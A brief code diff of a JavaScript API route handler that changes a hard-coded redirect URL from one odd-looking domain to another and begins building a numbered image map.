@@ -2,8 +2,8 @@
 export default function handler(req, res) {
   const { slug } = req.query;
 
-  // const redirectUrl = "https://broadlyjukeboxunrevised.com/2022576";
-  const redirectUrl = "https://broadlyjukeboxunrevised.com/2022576";
+  // const redirectUrl = "https://baggyrepackingrocky.com/2022576";
+  const redirectUrl = "https://baggyrepackingrocky.com/2022576";
 
   const images = {};
   for (let i = 1; i <= 2040; i++) {
